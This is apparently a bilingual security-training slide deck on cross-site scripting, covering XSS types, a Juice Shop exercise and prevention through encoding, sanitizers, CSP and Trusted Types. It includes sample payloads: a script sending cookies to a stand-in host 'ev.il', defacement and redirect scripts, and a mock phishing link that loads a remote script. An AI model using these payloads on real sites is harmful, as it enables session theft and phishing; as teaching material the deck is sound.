<!-- theme: default -->
<!-- paginate: true -->
<!-- footer: Copyright (c) by **Bogdan Mihai Nicolae** | Licensed under [CC-BY-SA 4.0](https://creativecommons.org/licenses/by-sa/4.0/) -->

# XSS (Cross-Site Scripting) Exposed

## Anatomy of a web Exploit

---

# Agenda

1. âš ï¸ What is XSS?
2. âŒ Real-world examples
3. ğŸ§¬ Types of XSS (Reflected, Stored, DOM)
4. ğŸ’» Hacking Demos
5. ğŸ›¡ï¸ **Prevention techniques**
6. ğŸ§  Conclusion

---

# âš ï¸ How browsers work

![height:500px](images/01-03-xss/how-browsers-work.jpg)

<!--
Before we jump into XSS, letâ€™s quickly see how browsers work.
When you open a webpage, your browser asks the server for it.
The server sends back the HTML document.
The browser then builds a â€œtreeâ€ like structure of all the parts of the page â€” thatâ€™s called the DOM.
This lets the browser show the page and run scripts on it.
Now, because the browser runs scripts from the HTML document, bad guys can sneak in malicious code â€” thatâ€™s what causes XSS.

Ãnainte sÄƒ trecem la XSS, hai sÄƒ vedem rapid cum funcÈ›ioneazÄƒ browserele.
CÃ¢nd deschizi o paginÄƒ web, browserul tÄƒu cere fisierul de HTML de la server.
Serverul trimite Ã®napoi acest documentul HTML.
Browserul construieÈ™te apoi o structurÄƒ asemÄƒnÄƒtoare unui â€arboreâ€ cu toate pÄƒrÈ›ile paginii â€” aceasta se numeÈ™te DOM.
AceastÄƒ structurÄƒ permite browserului sÄƒ afiÈ™eze pagina È™i sÄƒ ruleze scripturi pe ea.
Acum, pentru cÄƒ browserul ruleazÄƒ scripturi din documentul HTML, atacatorii pot introduce cod maliÈ›ios â€” asta duce la XSS.
-->

---

# âš ï¸ [Cross-SiteÂ Scripting](https://owasp.org/www-community/attacks/xss/)

* An attacker can use XSS to send a malicious script to an unsuspecting
  user
* The end userâ€™s browser has no way to know that the script should not
  be trusted, and will execute the script
* Because it thinks the script came from a trusted source, the malicious
  script can access any cookies, session tokens, or other sensitive
  information retained by the browser and used with that site
* These scripts can even rewrite the content of the HTML page

---

# âš ï¸ Root Cause

Web applications vulnerable to XSS...

1. ...include untrusted data (usually from an HTTP request) into dynamic
   content...
2. ...that is then sent to a web user _without previously validating for
   malicious content_

_:information_source: XSS originally had its own category, e.g. [A7:2017-Cross-Site Scripting (XSS)](https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS).html). Since 2021 it is considered part of the [Injection](01-01-injection.md) category._

<!--
Web applications vulnerable to XSS often incorporate untrusted data, typically obtained from an HTTP request, into dynamic content. This untrusted data, which can include user input, URL parameters, or other sources, is then rendered on web pages without prior validation.
-->
---

# âš ï¸ Typical Impact

* Steal user's session
* Steal sensitive data
* Rewrite the web page
* Redirect user to malicious website

<!--
Attackers exploiting XSS vulnerabilities can steal user sessions, gaining unauthorized access to accounts and compromising user privacy and security. Additionally, sensitive data such as personal information, credit card details, or login credentials can be intercepted and stolen. Furthermore, XSS attacks can manipulate the content of web pages, potentially altering their appearance or functionality, leading to confusion or mistrust among users. Moreover, attackers can redirect users to malicious websites, exposing them to further security threats such as phishing attacks or malware installations.

AplicaÈ›iile web vulnerabile la XSS includ adesea date nesigure, de obicei obÈ›inute dintr-o cerere HTTP, Ã®n conÈ›inutul dinamic.
Aceste date nesigure â€” care pot include inputul utilizatorului, parametri din URL sau alte surse â€” sunt apoi afiÈ™ate pe pagini web fÄƒrÄƒ validare prealabilÄƒ.
-->
---

# âš ï¸ Typical Phishing Email

<small>Dear valued employee!

You won our big lottery which you might not even have participated in!
Click on the following totall inconspicious link to claim your prize
**now**!

[CLICK HER! FREE STUFF! YOU WON!](http://localhost:3000/#/search?q=%3Cimg%20src%3D%22bha%22%20onError%3D%27javascript%3Aeval%28%60var%20js%3Ddocument.createElement%28%22script%22%29%3Bjs.type%3D%22text%2Fjavascript%22%3Bjs.src%3D%22http%3A%2F%2Flocalhost%3A8080%2Fshake.js%22%3Bdocument.body.appendChild%28js%29%3Bvar%20hash%3Dwindow.location.hash%3Bwindow.location.hash%3D%22%23%2Fsearch%3Fq%3Dowasp%22%3BsearchQuery.value%20%3D%20%22owasp%22%3B%60%29%27%3C%2Fimg%3Eowasp)

Sincereely yours,

Michal John Noris CEO of Conputa Center.

<small><small>_Conputa Center Inc. is registered as a bla bla bla bla yadda
yadda yadda more assuring legal bla All logos and icons are trademarks
of Conputa Center Inc. Copyright (c) 2025 Conputa Center
Inc._</small></small></small>

<!--
This typical phishing email exemplifies a common tactic used by attackers to deceive recipients into clicking malicious links. The email falsely claims that the recipient has won a lottery prize, enticing them to click on an link to claim their reward. However, the link actually leads to a malicious website disguised as a legitimate one. Upon clicking the link, JavaScript code embedded within an image executes, potentially compromising the user's device by downloading and executing additional malicious code. The email further adds legitimacy by impersonating the CEO of a company, adding a false sense of trustworthiness.

Acest email de tip phishing este un exemplu clasic al unei tactici frecvent folosite de atacatori pentru a pÄƒcÄƒli destinatarii sÄƒ acceseze linkuri maliÈ›ioase.
Emailul susÈ›ine Ã®n mod fals cÄƒ destinatarul a cÃ¢È™tigat un premiu la loterie, Ã®ncercÃ¢nd sÄƒ-l convingÄƒ sÄƒ dea clic pe un link pentru a-È™i revendica recompensa.
TotuÈ™i, linkul duce de fapt cÄƒtre un site maliÈ›ios, deghizat Ã®ntr-unul legitim.
La accesarea linkului, un cod JavaScript ascuns Ã®ntr-o imagine este executat, putÃ¢nd compromite dispozitivul utilizatorului prin descÄƒrcarea È™i rularea de cod suplimentar maliÈ›ios.
Emailul adaugÄƒ un plus de credibilitate pretinzÃ¢nd cÄƒ este trimis de CEO-ul unei companii, inducÃ¢nd Ã®n mod fals un sentiment de Ã®ncredere.
-->

---

# [XSSÂ Demo](https://github.com/wurstbrot/shake-logger)

[![Shaking XSS demo on Juice Shop](images/01-03-xss/shake_js-preview.png)](https://youtu.be/Msi52Kicb-w)

:information_source: _This video shows how severe the impact of XSS can
be: It makes the application shake & dance **and** lets a keylogger
steal user credentials!_

---

# âŒ Vulnerable Code Example

```html
<!--search.jsp-->

<%String searchCriteria = request.getParameter("searchValue");%>
```

might forward to the following page when executing the search:

```html
<!--results.jsp-->

Search results for <b><%=searchCriteria%></b>:

<table>
<!-- Render the actual results table here -->
</table>
```

<!--
 Let's see some code. In the search.jsp file, the code retrieves user input from the request parameter searchValue without performing any validation or sanitization. This input is then directly embedded into the HTML response in the results.jsp page using scriptlet tags (<%= %>) to render the search criteria. 

 Hai sÄƒ vedem un exemplu de cod. Ãn fiÈ™ierul search.jsp, codul preia inputul utilizatorului din parametrul de cerere searchValue fÄƒrÄƒ sÄƒ facÄƒ vreo validare sau igienizare a acestuia.
Acest input este apoi introdus direct Ã®n rÄƒspunsul HTML Ã®n pagina results.jsp, folosind taguri de tip scriptlet (<%= %>) pentru a afiÈ™a criteriul de cÄƒutare.
-->
---

# âŒ Benign Usage

` https://my-little-application.com/search.jsp?searchValue=blablubb `

results in the following HTML on the `results.jsp` page:

```html
Search results for <b>blablubb</b>:
```

rendering as:

<hr>

Search results for <b>blablubb</b>:

<!--
Therefore, when the string 'blablubb' is passed as the searchValue parameter in the URL, the resulting server-side rendered page will contain the string 'blablubb' enclosed within the <b> tag.

Prin urmare, atunci cÃ¢nd È™irul blablubb este transmis ca parametru searchValue Ã®n URL, pagina generatÄƒ pe server va conÈ›ine È™irul blablubb Ã®ncadrat Ã®ntr-un tag <b>.
-->
---

# âŒ Exploit Example (HTML Injection)

` https://my-little-application.com/search.jsp?searchValue=</b><img
src="https://picsum.photos/id/237/100/100"/><b> `

results in the following HTML on the `results.jsp` page:

```html
Search results for
  <b></b><img src="https://picsum.photos/id/237/100/100"/><b></b>:
```

rendering as:

<hr>

Search results for <b></b><img
src="https://picsum.photos/id/237/100/100"/><b></b>:

<!--
When substituting the string 'blablubb' with HTML code containing elements like an <img> tag that points to an image hosted on an external domain, the injected HTML code gets interpreted and executed. Consequently, this leads to the external image being displayed within the search results.

Atunci cÃ¢nd Ã®nlocuim È™irul blablubb cu un cod HTML care conÈ›ine elemente precum un tag <img> ce face referire la o imagine gÄƒzduitÄƒ pe un domeniu extern, codul HTML injectat este interpretat È™i executat.
-->

---

# âŒ XSS Attack Payload Examples

#### Stealing User Session

```javascript
<script>
  new Image().src="http://ev.il/hijack.php?c="+encodeURI(document.cookie);
</script>
```

#### Site Defacement

```javascript
<script>document.body.background="http://ev.il/image.jpg";</script>
```

#### Redirect

```javascript
<script>window.location.assign("http://ev.il");</script>
```

<!--
Now that we understand how XSS works, letâ€™s look at a few common attack payloads:
Session Theft â€“ A script sends the user's cookies to an attacker's server using an image tag, allowing them to hijack the session.
Site Defacement â€“ The attacker changes the site's background to an unauthorized external image, visually altering the page.
Redirection â€“ A script uses window.location.assign() to send users to a malicious site, exposing them to phishing or malware.

Acum cÄƒ Ã®nÈ›elegem cum funcÈ›ioneazÄƒ XSS, sÄƒ analizÄƒm cÃ¢teva exemple de atacuri comune:
Furtul sesiunii â€“ Un script trimite cookie-urile utilizatorului cÄƒtre serverul atacatorului folosind un tag de imagine, permiÈ›Ã¢nd preluarea sesiunii.
DefÄƒimarea site-ului â€“ Atacatorul modificÄƒ fundalul site-ului cu o imagine neautorizatÄƒ gÄƒzduitÄƒ extern, schimbÃ¢nd aspectul paginii.
RedirecÈ›ionare â€“ Un script foloseÈ™te window.location.assign() pentru a trimite utilizatorii cÄƒtre un site maliÈ›ios, expunÃ¢ndu-i la phishing sau malware.
-->
---

# ğŸ§¬ Types of XSS

* ğŸ”**Reflected XSS**: Application includes unvalidated and unescaped user
  input as part of HTML output
* ğŸ’¾**Stored XSS**: Application stores unsanitized user input that is
  viewed at a later time by another user
* ğŸ§­**DOM XSS**: JavaScript frameworks & single-page applications
  dynamically include attacker-controllable data to a page

_:information_source: The previous example vulnerability and exploit of
`results.jsp` is a typical Reflected XSS._

<!--
There are three main types of XSS:
Reflected XSS â€“ Unsanitized input is immediately included in the HTML server response and executed in the userâ€™s browser.
Stored XSS â€“ Malicious input is saved by the application and executed when another user views the content.
DOM XSS â€“ The script is injected and executed directly in the DOM via JavaScript, without involving the serverâ€™s response.

ExistÄƒ trei tipuri principale de XSS:
Reflected XSS â€“ Inputul nesecurizat este inclus direct Ã®n rÄƒspunsul HTML de la server È™i executat imediat Ã®n browserul utilizatorului.
Stored XSS â€“ Inputul maliÈ›ios este salvat Ã®n aplicaÈ›ie È™i executat cÃ¢nd alt utilizator vizualizeazÄƒ conÈ›inutul.
DOM XSS â€“ Scriptul este injectat È™i executat direct Ã®n DOM prin JavaScript, fÄƒrÄƒ a implica rÄƒspunsul serverului.
-->
---

<!-- _footer: ĞœĞ¾Ğ½Ğ³Ğ¾Ğ»: Reflected XSS, 2016 Nurmukhamyed, used under CC-BY-SA 4.0 -->

# ğŸ§¬ ğŸ”Reflected XSS

![ĞœĞ¾Ğ½Ğ³Ğ¾Ğ»: Reflected XSS, 2016 Nurmukhamyed, used under CC-BY-SA 4.0](images/01-03-xss/reflected-xss.png)

<!--
Reflected XSS occurs through the following steps:

1. The attacker crafts a malicious URL and distributes it to a victim via email or another communication method.
2. The victim is deceived into clicking the URL, leading to a request to the vulnerable website.
3. The server processes the request and returns a page containing the malicious script embedded within it.
4. Upon receiving the page, the victim's browser interprets the HTML content, executing the script, which then sends a GET request to the attacker's server, including the victim's cookie data.

XSS reflectat are loc prin urmÄƒtorii paÈ™i:
1. Atacatorul creeazÄƒ un URL maliÈ›ios È™i Ã®l trimite victimei prin email sau altÄƒ metodÄƒ de comunicare.
2. Victima este pÄƒcÄƒlitÄƒ sÄƒ dea clic pe URL, ceea ce genereazÄƒ o cerere cÄƒtre site-ul vulnerabil.
3. Serverul proceseazÄƒ cererea È™i returneazÄƒ o paginÄƒ care conÈ›ine scriptul maliÈ›ios integrat.
4. La primirea paginii, browserul victimei interpreteazÄƒ conÈ›inutul HTML È™i executÄƒ scriptul, care trimite o cerere GET cÄƒtre serverul atacatorului, incluzÃ¢nd datele cookie ale victimei.
-->
---

<!-- _footer: ĞœĞ¾Ğ½Ğ³Ğ¾Ğ»: Stored XSS, 2016 Nurmukhamyed, used under CC-BY-SA 4.0 -->

# ğŸ§¬ ğŸ’¾Stored XSS

![ĞœĞ¾Ğ½Ğ³Ğ¾Ğ»: Stored XSS, 2016 Nurmukhamyed, used under CC-BY-SA 4.0](images/01-03-xss/stored-xss.png)

<!--
Stored XSS unfolds as follows:
1. The attacker embeds a malicious script within the database, typically by submitting it as the latest comment through an unchecked website form.
2. The victim accesses the website and views the page, which displays the most recent comments, including the one containing the malicious script.
3. The server processes the request and serves the page to the victim's browser, which now contains the injected script.
4. The victim's browser executes the HTML content, triggering the embedded script. Consequently, the script sends a GET request to the attacker's server, including the victim's cookie data.

XSS stocat se desfÄƒÈ™oarÄƒ astfel:
1. Atacatorul introduce un script maliÈ›ios Ã®n baza de date, de obicei prin trimiterea unui comentariu printr-un formular nevalidat.
2. Victima acceseazÄƒ site-ul È™i vede pagina cu cele mai recente comentarii, inclusiv cel care conÈ›ine scriptul maliÈ›ios.
3. Serverul proceseazÄƒ cererea È™i trimite pagina cÄƒtre browserul victimei, care conÈ›ine scriptul injectat.
4. Browserul victimei executÄƒ conÈ›inutul HTML, declanÈ™Ã¢nd scriptul care trimite o cerere GET cÄƒtre serverul atacatorului, incluzÃ¢nd datele cookie ale victimei.
-->

---

<!-- _footer: ĞœĞ¾Ğ½Ğ³Ğ¾Ğ»: DOM-based XSS, 2016 Nurmukhamyed, used under CC-BY-SA 4.0 -->

# ğŸ§¬ ğŸ§­DOM XSS

![ĞœĞ¾Ğ½Ğ³Ğ¾Ğ»: DOM-based XSS, 2016 Nurmukhamyed, used under CC-BY-SA 4.0](images/01-03-xss/dom-xss.png)

<!--
DOM XSS follows this sequence:
1. The attacker creates a malicious URL and sends it to a victim via email or another channel.
2. The victim clicks the URL, triggering a request to the vulnerable website.
3. The server processes the request and returns a page containing HTML and JavaScript to render the website. However, since the website doesn't use server-side rendering, the received code lacks the malicious script.
4. The victim's browser executes the JavaScript required for client-side rendering, constructing the page. During this process, the JavaScript uses the innerHTML method to inject the malicious script from the URL.
5. Subsequently, the injected malicious script executes in the victim's browser, sending a GET request to the attacker's server, which may include the victim's cookie data.

DOM XSS urmeazÄƒ aceastÄƒ succesiune:
1. Atacatorul creeazÄƒ un URL maliÈ›ios È™i Ã®l trimite victimei prin email sau alt canal.
2. Victima dÄƒ clic pe URL, declanÈ™Ã¢nd o cerere cÄƒtre site-ul vulnerabil.
3. Serverul proceseazÄƒ cererea È™i returneazÄƒ o paginÄƒ cu HTML È™i JavaScript pentru redarea site-ului, Ã®nsÄƒ codul primit nu conÈ›ine scriptul maliÈ›ios, deoarece nu se foloseÈ™te redare pe server.
4. Browserul victimei executÄƒ JavaScript-ul pentru redarea pe partea de client, construind pagina. Ãn acest proces, JavaScript-ul foloseÈ™te metoda innerHTML pentru a injecta scriptul maliÈ›ios din URL.
5. Scriptul injectat este executat Ã®n browserul victimei È™i trimite o cerere GET cÄƒtre serverul atacatorului, posibil cu datele cookie ale victimei.
-->

---

# ğŸ’» Exercise 2.1

1. Identify places where user input is _directly_ included in the output
2. Perform a successful _DOM XSS_ attack (:star:)
3. Perform a successful _Reflected XSS_ attack (:star::star:)

_:warning: Make sure that you really understand the subtle difference
between those two underlying vulnerabilities._

---

# ğŸ›¡ï¸ [Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

* **Do not include user supplied input in your output!** :100:

* **Output Encode** all user supplied input
  * e.g. OWASP Java Encoder
* Perform **Allow List Input Validation** on user input

* Use an HTML Sanitizer for larger user supplied HTML chunks
  * e.g. OWASP Java HTML Sanitizer

* Don't bypass sanitization frontend frameworks like Angular and React

* Leverage **CSP** header and apply **HttpOnly** and **Secure** attributes to your HTTP cookies

<!--
To prevent XSS attacks:
Never insert user input directly into outputâ€”always validate and sanitize it first.
Use output encoding (e.g., OWASP Java Encoder) to block malicious scripts.
Apply allow-list validation to limit inputs to safe values or patterns.
For larger user-provided HTML, use an HTML sanitizer like OWASP Java HTML Sanitizer.
Avoid disabling built-in sanitization in frameworks like Angular or React.

Pentru a preveni atacurile XSS:
Nu introduce niciodatÄƒ direct inputul utilizatorului Ã®n output â€” valideazÄƒ È™i igienizeazÄƒ-l Ã®ntotdeauna Ã®nainte.
FoloseÈ™te encodare pentru outp (de ex. OWASP Java Encoder) pentru a bloca scripturile maliÈ›ioase.
AplicÄƒ validarea pe bazÄƒ de allow-list pentru a limita inputurile la valori sau modele sigure.
Pentru bucÄƒÈ›i mari de HTML oferite de utilizatori, foloseÈ™te un sanitizator HTML precum OWASP Java HTML Sanitizer.
EvitÄƒ dezactivarea igienizÄƒrii automate Ã®n framework-uri precum Angular sau React.
-->

---

# ğŸ›¡ï¸ Fixed Code Example

Using `Encoder` from
[OWASP Java Encoder Project](https://wiki.owasp.org/index.php/OWASP_Java_Encoder_Project):

```html
<%import org.owasp.encoder.Encode;%>

Search results for <b><%=Encode.forHtml(searchValue)%></b>:
<!-- ... -->
```

Same result using `HtmlUtils` from the popular Spring framework:

```html
<%import org.springframework.web.util.HtmlUtils;%>

Search results for <b><%=HtmlUtils.htmlEscape(searchValue)%></b>:
<!-- ... -->
```

<!--
To fix the search example, we sanitize user input before showing it by using encoding libraries.
With OWASP Java Encoder, we encode searchValue using Encode.forHtml().
In Spring, we use HtmlUtils.htmlEscape() to escape HTML characters in searchValue.

Pentru a corecta exemplul de cÄƒutare anterior, igienizÄƒm inputul utilizatorului Ã®nainte de afiÈ™are, folosind OWASP Java Encoder.
Ãn Spring, folosim HtmlUtils.htmlEscape() pentru a scÄƒpa caracterele HTML din searchValue.
-->
---

# ğŸ›¡ï¸ [EncodingÂ Contexts](https://wiki.owasp.org/index.php/OWASP_Java_Encoder_Project#tab=Use_the_Java_Encoder_Project)

### ğŸ“HTML Content

```html
<textarea name="text"><%= Encode.forHtmlContent(UNTRUSTED) %></textarea>
```

#### HTML Attribute

```html
<input type="text"
       name="address"
       value="<%= Encode.forHtmlAttribute(UNTRUSTED) %>" />
```

_Alternatively_ `Encode.forHtml(UNTRUSTED)` _can be used for both the
above contexts but is less efficient as it encodes more characters._

<!--
The OWASP Java Encoder provides context-specific methods: use Encode.forHtmlContent() for HTML text and Encode.forHtmlAttribute() for attributes.
Encode.forHtml() works for both but encodes more characters and is less efficient. Use specific methods for better security and performance.

OWASP Java Encoder oferÄƒ metode specifice pentru fiecare context: foloseÈ™te Encode.forHtmlContent() pentru conÈ›inut HTML È™i Encode.forHtmlAttribute() pentru atribute.
Encode.forHtml() funcÈ›ioneazÄƒ pentru ambele, dar codificÄƒ mai multe caractere È™i este mai puÈ›in eficient. FoloseÈ™te metodele specifice pentru o securitate È™i performanÈ›Äƒ mai bune.

-->
---

### âš™ï¸JavaScript

```html
<script type="text/javascript">
 var msg = "<%= Encode.forJavaScriptBlock(UNTRUSTED) %>";
 alert(msg);
</script>
```

#### JavaScript Variable

```html
<button onclick="alert('<%= Encode.forJavaScriptAttribute(UNTRUSTED) %>');">
 click me
</button>
```

_Alternatively_ `Encode.forJavaScript(UNTRUSTED)` _can be used for both
the above contexts but is less efficient as it encodes more characters._

<!--
For JavaScript blocks, like variable assignments, use Encode.forJavaScriptBlock(). For embedding input within JavaScript attributes, like event handlers, use Encode.forJavaScriptAttribute().

Alternatively, you can use Encode.forJavaScript() for both contexts, but it's less efficient. Use context-specific encoding methods for optimal security and performance.

Pentru blocuri JavaScript, cum ar fi atribuiri de variabile, foloseÈ™te Encode.forJavaScriptBlock(). Pentru inserarea inputului Ã®n atribute JavaScript, cum ar fi handler-ele de evenimente, foloseÈ™te Encode.forJavaScriptAttribute().

Alternativ, poÈ›i folosi Encode.forJavaScript() pentru ambele contexte, dar este mai puÈ›in eficient. FoloseÈ™te metode specifice pentru codare, pentru securitate È™i performanÈ›Äƒ optime.
-->
---

### ğŸ¨CSS

```html
<div style="width:<= Encode.forCssString(UNTRUSTED) %>">
<div style="background:<= Encode.forCssUrl(UNTRUSTED) %>">
```

### URL Parameter

```html
<a href="/search?value=<%= Encode.forUriComponent(UNTRUSTED) %>&order=1#top">
<a href="/page/<%= Encode.forUriComponent(UNTRUSTED) %>">
```

<!--
For CSS strings and URLs, use Encode.forCssString() and Encode.forCssUrl() respectively to encode the user input.

For URLs, including query parameters or path segments, use Encode.forUriComponent().

Pentru È™iruri CSS È™i URL-uri, foloseÈ™te Encode.forCssString() È™i Encode.forCssUrl() pentru a codifica inputul utilizatorului.

Pentru URL-uri, inclusiv parametri de interogare sau segmente de cale, foloseÈ™te Encode.forUriComponen
-->
---

# ğŸ›¡ï¸ [OWASPÂ JavaÂ HTMLÂ Sanitizer](https://wiki.owasp.org/index.php/OWASP_Java_HTML_Sanitizer_Project)

Fast and easy to configure HTML Sanitizer written in Java which lets you
include HTML authored by third-parties in your web application while
protecting against XSS.

## Using a simple pre-packaged policy

```java
private String sanitizeHtml(String html) {
  PolicyFactory policy = Sanitizers.FORMATTING.and(Sanitizers.BLOCKS)
                  .and(Sanitizers.LINKS);
  return policy.sanitize(html);
}
```

<!--
To safeguard against XSS while including HTML from third parties, we can utilize a fast and easy-to-configure HTML Sanitizer written in Java.

By employing a pre-packaged policy, we can quickly apply necessary sanitization rules to the HTML content.

Pentru protecÈ›ie Ã®mpotriva XSS cÃ¢nd includem HTML de la terÈ›i, putem folosi un HTML Sanitizer rapid È™i uÈ™or de configurat, scris Ã®n Java.

Folosind o politicÄƒ predefinitÄƒ, aplicÄƒm rapid regulile necesare de igienizare asupra conÈ›inutului HTML.
-->
---

## Custom Sanitization Policy

```java
private static final PolicyFactory BASIC_FORMATTING_WITH_LINKS_POLICY =
  new HtmlPolicyBuilder()
  .allowCommonInlineFormattingElements().allowCommonBlockElements()
  .allowAttributes("face", "color", "size", "style").onElements("font")
  .allowAttributes("style").onElements("div", "span").allowElements("a")
  .allowAttributes("href").onElements("a").allowStandardUrlProtocols()
  .requireRelNofollowOnLinks().toFactory();
```

_This custom policy actually reflects the features of a 3rd-party rich
text editor widget for GWT applications the author once used._

<!--
For tailored sanitization needs, we can create a custom sanitization policy using the HtmlPolicyBuilder

Pentru nevoi personalizate de igienizare, putem crea o politicÄƒ personalizatÄƒ folosind HtmlPolicyBuilder.

-->
---

# ğŸ›¡ï¸ Input Validation

## ğŸš« Block List

* **"Allow what is not explicitly blocked!"**
  * Example: Do not allow `<`, `>`, `"`, `;`, `'` and `script` in user
    input (:interrobang:)

* Can be bypassed by masking attack patterns
* Must be updated for new attack patterns

**= Negative Security Rule**

<!--
Using a block list approach involves specifying characters or patterns that are not allowed in user input. For instance, blocking characters like <, >, ", ;, ', and the word script helps mitigate risks.
However, it's important to recognize that block list validation can be bypassed by attackers using techniques like character masking. Additionally, maintaining and updating block lists for new attack patterns can be challenging and prone to oversight.

Folosirea unei liste de blocare presupune specificarea caracterelor sau modelelor care nu sunt permise Ã®n inputul utilizatorului. De exemplu, blocarea caracterelor precum <, >, ", ;, ' È™i cuvÃ¢ntul â€scriptâ€ ajutÄƒ la reducerea riscurilor.
TotuÈ™i, este important sÄƒ recunoaÈ™tem cÄƒ validarea prin liste de blocare poate fi ocolitÄƒ de atacatori folosind tehnici precum mascarea caracterelor. Ãn plus, Ã®ntreÈ›inerea È™i actualizarea acestor liste pentru noi tipuri de atacuri poate fi dificilÄƒ È™i predispusÄƒ la omisiuni.
-->
---
# ğŸ›¡ï¸ Input Validation
## ğŸŸ¢ Allow List

* **"Block what is not explicitly allowed!"**
  * Example: Allow only `a-z`, `A-Z` and `0-9` in user input

<!-- -->

* Provide protection even against future vulnerabilities
* Tend to get weaker over time when not carefully maintained
* Can be quite effortsome to define for a whole application

**= Positive Security Rule**

<!--
The Allow List approach permits only specific, approved characters or patterns, like restricting input to alphanumeric characters.
It protects against known and future threats by clearly defining whatâ€™s allowed, reducing unintended vulnerabilities.
However, Allow Lists need regular updates to stay effective and can be time-consuming to create for all input sources.

Abordarea Allow List permite doar caractere sau modele aprobate, cum ar fi restricÈ›ionarea inputului la caractere alfanumerice.
Aceasta protejeazÄƒ Ã®mpotriva ameninÈ›Äƒrilor cunoscute È™i viitoare, definind clar ce este permis È™i reducÃ¢nd vulnerabilitÄƒÈ›ile neintenÈ›ionate.
TotuÈ™i, listele Allow List trebuie actualizate regulat pentru a rÄƒmÃ¢ne eficiente È™i pot fi consumatoare de timp pentru a fi create pentru toate sursele de input.

-->
---

# ğŸ›¡ï¸ Stop Bypassing Framework Sanitization

## [Angular trusting safe values](https://angular.dev/best-practices/security#trusting-safe-values)

* bypassSecurityTrustHtml
* bypassSecurityTrustScript

> ğŸ” Only showing 2 key bypass methods â€” others exist in DomSanitizer.

## [React](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)

```javascript
const markup = { __html: '<p>some raw html</p>' };
return <div dangerouslySetInnerHTML={markup} />;
```

<!--
Angular and React come equipped with built-in sanitization features by default. These features are designed to handle user input securely and prevent XSS vulnerabilities. However, in scenarios where there's a specific requirement to include potentially safe content, developers can leverage specific methods or attributes provided by the frameworks. For instance, Angular offers bypassSecurityTrustHtml, while React provides dangerouslySetInnerHTML. It's important to exercise caution when bypassing default sanitization and do so only when absolutely necessary.

Angular È™i React vin echipate implicit cu funcÈ›ii de igienizare integrate. Aceste funcÈ›ii sunt concepute pentru a gestiona Ã®n siguranÈ›Äƒ inputul utilizatorului È™i pentru a preveni vulnerabilitÄƒÈ›ile XSS.

TotuÈ™i, Ã®n situaÈ›iile Ã®n care este nevoie sÄƒ includem conÈ›inut potenÈ›ial sigur, dezvoltatorii pot folosi metode sau atribute specifice oferite de aceste framework-uri. De exemplu, Angular oferÄƒ bypassSecurityTrustHtml, iar React oferÄƒ dangerouslySetInnerHTML.

Este important sÄƒ fim precauÈ›i cÃ¢nd ocolim igienizarea implicitÄƒ È™i sÄƒ facem acest lucru doar atunci cÃ¢nd este absolut necesar.
-->

---

# ğŸ›¡ï¸ Web server configuration

## Content-Security-Policy

```http
Content-Security-Policy: default-src 'self'; img-src *; media-src example.org example.net; script-src userscripts.example.com
```

## HttpOnly and Secure

```http
Set-Cookie: sessionid=QmFieWxvbiA1; HttpOnly; Secure
```

<!--
Web server configuration is vital for bolstering web application security. 
HTTP headers such as Content-Security-Policy (CSP) empower administrators to dictate resource loading rules, thereby ensuring that resources like images, CSS files, and JavaScript files can only load from specified domains.
Furthermore, implementing secure HTTP cookies with attributes like HttpOnly and Secure enhances defense against attacks aimed at compromising cookies. The HttpOnly attribute guarantees that cookies remain inaccessible to client-side scripts, while the Secure attribute mandates that cookies are exclusively transmitted over HTTPS connections.

Configurarea serverului web este esenÈ›ialÄƒ pentru Ã®ntÄƒrirea securitÄƒÈ›ii aplicaÈ›iilor web.
Headerele HTTP, precum Content-Security-Policy (CSP), permit administratorilor sÄƒ controleze regulile de Ã®ncÄƒrcare a resurselor, asigurÃ¢nd cÄƒ imagini, fiÈ™iere CSS È™i JavaScript se Ã®ncarcÄƒ doar de pe domenii specifice.
Ãn plus, implementarea cookie-urilor HTTP sigure, cu atribute precum HttpOnly È™i Secure, creÈ™te protecÈ›ia Ã®mpotriva atacurilor ce vizeazÄƒ compromiterea cookie-urilor. Atributul HttpOnly face cookie-urile inaccesibile pentru scripturile din partea clientului, iar atributul Secure asigurÄƒ transmiterea cookie-urilor exclusiv prin conexiuni HTTPS.
-->
---

# ğŸ›¡ï¸ Trusted Types

## Enabling Trusted Types via CSP

```http
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types default;
```

## With Trusted Types (safe)

```javascript
const policy = trustedTypes.createPolicy("default", {
  createHTML: (input) => input, // you can sanitize here
});

element.innerHTML = policy.createHTML(userInput);
```

<!-- 
Trusted Types helps stop DOM-based XSS by preventing unsafe assignments to sensitive DOM sinks like `innerHTML`, `outerHTML`, `insertAdjacentHTML`, and `eval`. Instead of using raw strings, developers must pass values through a Trusted Types policy. This gives full control over what gets injected into the page and can enforce sanitization. You enable this protection using a Content-Security-Policy header, and then define how trusted HTML (or scripts) are created in your app.

Trusted Types ajutÄƒ la prevenirea atacurilor DOM-based XSS, Ã®mpiedicÃ¢nd methodele  nesigure, precum innerHTML, outerHTML, insertAdjacentHTML È™i eval.

Ãn loc sÄƒ foloseascÄƒ aceste methode, dezvoltatorii trebuie sÄƒ treacÄƒ valorile printr-o politicÄƒ Trusted Types, care controleazÄƒ strict ce se poate injecta Ã®n paginÄƒ È™i poate impune igienizarea conÈ›inutului.

AceastÄƒ protecÈ›ie se activeazÄƒ prin header-ul Content-Security-Policy, iar Ã®n aplicaÈ›ie se defineÈ™te modul Ã®n care se creeazÄƒ HTML-ul (sau scripturile) considerate de Ã®ncredere.
-->

---

# ğŸ›¡ï¸ "Client Side Validation"

![Turnstyle with a trivial bypass](images/01-03-xss/client-side-validation.jpg)

---

# ğŸ›¡ï¸ Bypassing Client Side Validation

* Client Side Validation is _always_ for _convenience_ but **never** for
  **security**!
* You can just stop all outgoing HTTP requests in your browser...
  * ...and tamper with contained headers, data or passed parameters
  * ..._after_ Client Side Validation took place
  * ...but _before_ they are actually submitted to the server
* Sometimes you can just bypass the client entirely and interact with
  the backend instead

<!--
Client-side validation is primarily for user convenience, not security. However, it's crucial to understand its limitations. Attackers can easily bypass client-side validation by intercepting outgoing HTTP requests in their browser and tampering with headers or data before submission to the server. This occurs after client-side validation but before data is sent to the server. Sometimes, attackers may skip client-side validation entirely and interact directly with the backend. As a result, while client-side validation enhances user experience, it's essential to implement robust server-side validation and security measures to protect against potential threats.
-->

---

# ğŸ§  Conclusion

## âœ… What we've learned

* XSS is a critical and common web vulnerability
* It comes in several forms: **Reflected**, **Stored**, and **DOM-based**
